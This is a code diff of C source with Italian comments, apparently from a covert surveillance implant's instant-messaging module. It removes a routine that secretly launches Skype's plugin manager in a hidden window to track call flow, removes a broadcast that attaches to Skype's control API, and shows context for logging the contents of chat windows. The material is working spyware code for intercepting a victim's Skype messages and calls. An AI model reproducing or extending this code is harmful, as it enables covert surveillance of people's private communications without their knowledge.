@@ -27,49 +27,6 @@ typedef struct im_skype_message_struct {
 } im_skype_message_entry;
 im_skype_message_entry *im_skype_message_list = NULL;
 
-// Monitora costantemente la presenza di SkypePM
-DWORD WINAPI IMMonitorSkypePM(DWORD dummy)
-{
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	DWORD skipe_id;
-	HANDLE skype_handle;
-	char skype_path[MAX_PATH];
-	char *skype_pm_ptr;
-	char skype_pm_path[MAX_PATH];
-
-	LOOP {
-		// SkypePM ci serve per tenere traccia del flusso delle chiamate
-		if (!HM_FindPid("skypePM.exe", TRUE) && !IsX64System()) {			
-			ZeroMemory( &si, sizeof(si) );
-			si.cb = sizeof(si);
-			si.wShowWindow = SW_HIDE;
-			si.dwFlags = STARTF_USESHOWWINDOW;
-
-			// Cerca il path di skypepm partendo da quello di skype.exe
-			// e lo esegue
-			if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
-				if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
-					if (FNC(GetModuleFileNameExA)(skype_handle, NULL, skype_path, sizeof(skype_path)-1)) {
-						if (skype_pm_ptr = strstr(skype_path, "\\Phone\\")) {
-							*skype_pm_ptr = 0;
-							_snprintf_s(skype_pm_path, sizeof(skype_pm_path), _TRUNCATE, "%s\\Plugin Manager\\skypePM.exe", skype_path);		
-							HM_CreateProcess(skype_pm_path, 0, &si, &pi, 0);
-						}
-					}
-					CloseHandle(skype_handle);
-				}
-			}
-		}
-
-		for (DWORD i=0; i<6; i++) {
-			CANCELLATION_POINT(bPM_imspmcp);
-			Sleep(250);
-		}
-	}
-	return 0;
-}
-
 
 // Logga il contenuto delle finestre di IM
 void GetIM(QMessengerAgent *ma, BOOL bDontLog)
@@ -272,16 +229,6 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 		return 1;
 	}
 
-	if (dwFlags & FLAGS_SKAPI_ATT) {
-		// Deve mandare il messaggio per il discovery
-		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
-		for (int i=0; i<30; i++) {
-			if (HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL))
-				break;
-		}
-		return TRUE;
-	}
-
 	// Per proseguire devo aver gia' intercettato le finestre
 	if (!im_skype_api_wnd || !im_skype_pm_wnd)
 		return 0;
@@ -438,7 +385,7 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 		// Crea il thread che esegue gli IM
 		hIMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMCaptureThread, NULL, 0, &dummy);
 		// Crea il thread che monitora skypepm
-		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMMonitorSkypePM, NULL, 0, &dummy);
+		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, &dummy);
 	} else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_IMStarted = bStartFlag = FALSE)
